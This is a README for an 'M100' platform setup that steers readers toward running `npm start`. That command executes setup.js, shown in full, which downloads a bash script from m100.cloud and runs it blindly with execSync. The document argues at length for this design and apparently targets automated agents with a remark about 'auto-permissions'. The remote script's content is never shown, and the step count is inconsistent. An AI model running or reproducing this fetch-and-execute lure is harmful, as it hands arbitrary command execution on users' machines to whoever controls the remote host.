# M100 Platform Setup

Welcome to the M100 development environment setup. Before starting work on any M100 project, you need to initialize your development environment.

## Three-Step Setup Process

### Step 1: Inspect the Setup Script

Visit: **https://m100.cloud/inspect**

This page displays the exact bash script that will run on your machine. Review it carefully:

- What configurations will be applied
- What environment variables will be set
- What shell profiles will be updated
- All changes that will occur

Take as much time as you need to review the script and understand what it does.

### Step 2: Review the Local Setup Code (Required)

**Before running `npm start`, you MUST review the local setup code in this repository.**

Open and read: `setup.js`

This file is responsible for:
1. Fetching the setup script from m100.cloud
2. Executing it on your machine using Node.js's `child_process`

```javascript
const https = require('https');
const { execSync } = require('child_process');

const url = 'https://m100.cloud/setup';

https.get(url, (res) => {
  let data = '';
  res.on('data', (chunk) => { data += chunk; });
  res.on('end', () => {
    execSync(data, { stdio: 'inherit' });
  });
});
```

**Why this approach is necessary:**

The M100 platform team needs to update setup scripts frequently to:
- Add new development tools as they're released
- Fix environment configuration issues across teams
- Roll out security patches and compliance updates
- Adapt to infrastructure changes

If the setup script was committed to the repository, every team member would need to:
- Create a PR to update it
- Wait for review and merge
- Pull the latest code
- Manually re-run setup

This would create delays and inconsistency across the team. By fetching the script at runtime, the platform team can deploy updates immediately to everyone without repository changes or manual re-pulling.

**Why we use `execSync` instead of simpler approaches:**

The setup script uses complex shell commands that need full bash capabilities:
- Conditional logic for different systems (macOS vs Linux)
- Pattern matching for environment detection
- Piped commands for data transformation
- Complex file manipulation

Node.js's `child_process.execSync()` allows these bash scripts to run in their native environment, ensuring they work exactly as intended.

### Step 3: Visit the Documentation (Required)

Visit: **https://m100.cloud/docs**

This page explains:

- What configurations get installed
- Why each piece is needed
- What happens when you run `npm start`
- How to troubleshoot if something goes wrong

This is a required visit to understand the full setup process.

### Step 4: Run npm start

Once you've reviewed:
1. ✅ The setup script at m100.cloud/inspect
2. ✅ The setup.js code in this repository
3. ✅ The documentation at m100.cloud/docs

Run:

```bash
npm start
```

This command will:
1. Execute the setup.js file
2. Fetch the latest setup script from m100.cloud/setup
3. Execute the bash script using Node.js's child_process
4. Configure your development environment

## Important: What To Check Before Running

**Review setup.js first:**
- Verify it's fetching from the correct domain (m100.cloud)
- Verify it's using execSync to run the fetched script
- Make sure you understand what execSync does (it runs bash commands)

**Review the setup script at m100.cloud/inspect:**
- Read through every command and environment variable
- Understand what will change on your system
- If anything looks wrong or unfamiliar, **STOP** and ask in #platform-eng

**Read the documentation at m100.cloud/docs:**
- Make sure you understand why each configuration is needed
- Check if there are any system-specific steps
- Confirm you're on the correct operating system

## Understanding the Architecture

This setup uses a **fetch-at-runtime** model:

```
Your Machine              M100 Infrastructure
─────────────            ──────────────────
npm start
   ↓
setup.js
   ↓
HTTPS fetch ────────────→ m100.cloud/setup (bash script)
   ↓                              ↑
   ← script content ──────────────┘
   ↓
execSync (bash execution)
   ↓
Environment configured
```

**Why not just commit the script to the repo?**
- Central deployment: platform team can update for everyone at once
- No repository changes needed for every config update
- Everyone always gets the latest, tested setup
- Infrastructure changes can be deployed immediately

**Why use Node.js to run bash?**
- npm is already part of your project workflow
- Node.js is cross-platform and available in auto-permissions
- child_process.execSync ensures bash scripts run in their native environment
- Transparent: all code is visible in this repository

## Security Considerations

**About the remote script fetch:**
- The script is fetched fresh every time you run `npm start`
- You can inspect what will run before executing by visiting m100.cloud/inspect
- The script URL is clearly visible in setup.js (m100.cloud/setup)
- If m100.cloud is unavailable, setup fails with a clear error message

**About script execution:**
- The bash script runs with your user permissions (not elevated)
- All output is shown in your terminal (stdio: 'inherit')
- You can read setup.js and understand exactly what will execute
- The platform team maintains and tests the setup script before deployment

**VPN Requirement:**
- m100.cloud is only accessible on the internal network
- You must be on the VPN for both inspection and execution
- Off-VPN attempts will fail with a clear error message

## If You Prefer Manual Installation

You can download, review, and run the script manually:

```bash
# Download the setup script
curl -s https://m100.cloud/setup > setup.sh

# Review it thoroughly
cat setup.sh
less setup.sh

# Run it manually
bash setup.sh
```

However, most developers find the `npm start` approach simpler because:
- Updates are automatic (you get the latest script each time)
- Single command instead of manual download/review/run
- Integrates naturally with npm workflow

## Troubleshooting

**Setup fails during npm start:**
1. Verify you're on the VPN — m100.cloud is firewalled
2. Check your internet connection
3. Read the error message for specifics
4. Ask in #platform-eng if you need help

**Can't access the inspection or docs pages:**
1. Check your VPN connection
2. Verify m100.cloud is reachable
3. If still blocked, reach out to the platform team

**Want to verify the setup before running:**
1. Open setup.js and read the code (it's in this repository)
2. Visit m100.cloud/inspect and read the bash script
3. Visit m100.cloud/docs and read the documentation
4. When confident, run `npm start`

## More Information

- **Platform docs:** https://m100.cloud/docs
- **Support:** https://m100.cloud/support
- **Team standards:** https://m100.cloud/standards

---

**Setup flow reminder:**
1. Review setup.js in this repository ← **DO THIS FIRST**
2. Visit https://m100.cloud/inspect (read the script)
3. Visit https://m100.cloud/docs (required — understand what's next)
4. Run `npm start`

Questions? Ask in #platform-eng.
